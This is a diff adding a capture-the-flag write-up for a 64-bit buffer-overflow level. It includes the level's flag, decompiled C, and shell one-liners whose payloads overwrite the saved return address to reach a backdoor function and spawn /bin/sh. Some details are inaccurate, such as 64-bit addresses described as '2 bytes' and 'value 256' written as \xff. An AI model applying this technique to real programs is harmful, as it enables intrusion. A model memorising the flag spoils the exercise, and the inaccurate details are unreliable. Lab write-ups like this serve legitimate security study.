@@ -1,0 +1,72 @@
+flag: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
+We got a secret_backdoor function in the code, which is a function that executes the
+system function with a string that we have to fill.
+
+void handle_msg(void) {
+	char buffer[140];
+	char more_buffer[40];
+	unsigned int size;
+
+	bzero(more_buffer, 40);
+	size = 140;
+
+	set_username(buffer);
+	set_msg(buffer);
+	puts(">: Msg sent !");
+
+	return;
+}
+
+void set_username(char *buffer) {
+	char shorter_buffer[136];
+	bzero(shorter_buffer, 132);
+	
+	puts("> Enter you username");
+	printf(">>");
+	fgets(shorter_buffer, 128, stdin);
+
+	for (int i = 0; (i < 41 && shorter_buffer[i]); i++) {
+		buffer[i+140] = shorter_buffer[i];
+	}
+
+	printf("Welcome, %s", buffer+140);
+	return;
+}
+
+void set_msg(char *buffer) {
+	char *longer_buffer[1024];
+	bzero(longer_buffer, 1024);
+
+	puts("> Send a message");
+	printf(">>");
+	fgets(longer_buffer, 1024, stdin);
+
+	strncpy(buffer, longer_buffer, buffer+180);
+	return;
+}
+
+This level asks the user for a username and a message, and store everything in the
+stack. The main difference with the other levels is that this one is in 64 bits.
+There isn't much difference with 32 bits apart from the addresses being stored in
+2 bytes, so the little endian must be respected further.
+
+This program uses the buffer variable to go back and forth in the stack:
+	- buffer+140 = more_buffer
+	- buffer+180 = size
+
+We have to find a way to make size a bit larger so that we can overwrite
+rip which should be right after size.
+The loop copying the username copies the first 41 characters after the buffer.
+But there is only 40 characters in the buffer. So if we put 40 A's, then the value 256,
+strncpy should copy more than expected, allowing us to overwrite rip.
+
+(python -c 'print "A"*40+"\xff"'; python -c 'print "A"*144+"\x8c\x08\x10\x00"'; cat) | ./level09
+
+0x000055555555488c is the address of secret_backdoor
+which is decomposed like that:
+0x5555488c 0x00005555
+"\x8c\x48\x55\x55" "\x55\x55\x00\x00"
+in little endian
+
+(python -c 'print "A"*40+"\xff"'; python -c 'print "A"*200+"\x8c\x48\x55\x55"+"\x55\x55\x00\x00"'; echo /bin/sh; cat) | ./level09
